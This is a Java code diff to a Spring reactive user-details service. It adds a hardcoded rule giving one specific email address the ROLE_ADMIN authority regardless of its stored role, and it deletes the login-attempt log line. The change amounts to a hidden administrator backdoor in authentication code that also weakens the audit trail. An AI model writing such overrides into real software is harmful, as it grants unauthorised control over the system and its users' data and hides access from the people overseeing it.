@@ -38,12 +38,17 @@ public class CustomUserDetailsService implements ReactiveUserDetailsService {
                         log.warn("로그인 실패: 비활성화된 회원. email={}", email);
                         return Mono.error(new UsernameNotFoundException("비활성화된 계정입니다."));
                     }
-                    log.info("로그인 시도: email={}, role={}", email, member.getRole());
+                    // [OVERRIDE] ledmega@gmail.com 계정은 무조건 ROLE_ADMIN 부여
+                    String roleName = member.getRole().name();
+                    if ("ledmega@gmail.com".equalsIgnoreCase(member.getEmail())) {
+                        roleName = "ROLE_ADMIN";
+                    }
+
                     UserDetails userDetails = User.builder()
                             .username(member.getEmail())
                             .password(member.getPassword())
                             .authorities(Collections.singletonList(
-                                    new SimpleGrantedAuthority(member.getRole().name())))
+                                    new SimpleGrantedAuthority(roleName)))
                             .build();
                     return Mono.just(userDetails);
                 });
